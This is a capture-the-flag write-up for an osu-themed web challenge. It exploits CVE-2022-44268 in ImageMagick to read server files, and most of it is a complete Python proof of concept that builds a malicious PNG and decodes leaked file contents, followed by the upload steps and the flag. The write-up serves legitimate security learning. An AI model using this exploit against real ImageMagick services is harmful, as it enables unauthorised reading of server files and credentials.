# web/scorepost-generator

by WoodMan

## Summary

> let's see your crazy plays

## Challenge Solving

A critical line in the Dockerfile:

```docker
# HMMMMMMMMMMMMMMMMMMMMMMMMM......
FROM vulhub/imagemagick:7.1.0-49
# what an interesting image to use...
```

From this part we can identify a known vulnerability: **CVE-2022-44268**

> **CVE-2022-44268:**
> &#x20;When ImageMagick processes PNG files it parses `tEXt` chunks. If a `tEXt` chunk contains a `profile` keyword that points to a file path, ImageMagick will read that file and embed its contents into the output PNG’s Raw profile type field. The file contents are stored in the PNG metadata as hex-encoded data.

`scorepost.js` image-generation logic:

```javascript
...    
  const baseArgs = [
        bgImagePath,
        '-crop', cropGeometry,
        '+repage',
        '-resize', '1920x1080!',
        '-brightness-contrast', '-20,-20',
        '-colorspace', 'RGB',
        SKELETON_PATH,
        '-geometry', '+0+0',
        '-composite',
        '-font', FONT_PATH,
        '-fill', 'white',
        '-pointsize', '45',
        '-annotate', '+10+55', title,
        '-pointsize', '30',
        '-annotate', '+13+90', creator,
        '-annotate', '+13+124', player,
        basePath
    ];
    
    await execFileAsync('convert', baseArgs, { maxBuffer: 50 * 1024 * 1024 });
...
```

Next, we can write a proof-of-concept to generate a malicious image.

```python
#!/usr/bin/env python3
import struct
import zlib
import re
import argparse

def create_exploit_png(target_file, output_file):
    png = b'\x89PNG\r\n\x1a\n'

    ihdr = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    png += struct.pack('>I', 13)
    png += b'IHDR' + ihdr
    png += struct.pack('>I', zlib.crc32(b'IHDR' + ihdr))

    text_data = b'profile\x00' + target_file.encode()
    png += struct.pack('>I', len(text_data))
    png += b'tEXt' + text_data
    png += struct.pack('>I', zlib.crc32(b'tEXt' + text_data))

    idat = zlib.compress(b'\x00\xff\xff\xff')
    png += struct.pack('>I', len(idat))
    png += b'IDAT' + idat
    png += struct.pack('>I', zlib.crc32(b'IDAT' + idat))

    png += struct.pack('>I', 0)
    png += b'IEND'
    png += struct.pack('>I', zlib.crc32(b'IEND'))

    with open(output_file, 'wb') as f:
        f.write(png)

    print(f"[+] Created: {output_file} -> {target_file}")

def extract_flag_from_png(filename):
    with open(filename, 'rb') as f:
        data = f.read()

    pos = 8

    while pos < len(data):
        if pos + 8 > len(data):
            break

        length = struct.unpack('>I', data[pos:pos+4])[0]
        chunk_type = data[pos+4:pos+8]
        chunk_data = data[pos+8:pos+8+length]

        if chunk_type in [b'tEXt', b'zTXt', b'iTXt']:
            null_pos = chunk_data.find(b'\x00')
            if null_pos != -1:
                text = chunk_data[null_pos+1:].decode('latin1', errors='ignore')
                hex_match = re.findall(r'([0-9a-fA-F]{32,})', text)

                if hex_match:
                    for hex_str in hex_match:
                        try:
                            decoded = bytes.fromhex(hex_str)
                            print(decoded.decode('utf-8', errors='ignore'))
                        except:
                            pass

        pos += 12 + length

def main():
    parser = argparse.ArgumentParser(description='CVE-2022-44268 Exploit')
    subparsers = parser.add_subparsers(dest='mode')

    create_parser = subparsers.add_parser('create')
    create_parser.add_argument('-t', '--target', required=True)
    create_parser.add_argument('-o', '--output', default='exploit.png')

    extract_parser = subparsers.add_parser('extract')
    extract_parser.add_argument('-i', '--input', required=True)

    args = parser.parse_args()

    if args.mode == 'create':
        create_exploit_png(args.target, args.output)
    elif args.mode == 'extract':
        extract_flag_from_png(args.input)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
```

After the malicious image is ready, next we need to find the exploitation flow.

From `app.js` we see two files must be uploaded: `osz` and `osr` — the map archive and the replay file, respectively.

So we need to create a map package, place the malicious image inside it, and modify the `.osu` file with the following entry:

```
...
[Events]
0,0,"bg.png",0,0
...
```

Then play the map once and export a replay (F2).

Finally, upload the map package and the replay, obtain the generated output image, and feed it into the PoC to retrieve the flag.

## Flag

`osu{but_h0w_do_1_send_my_fc_now??}`

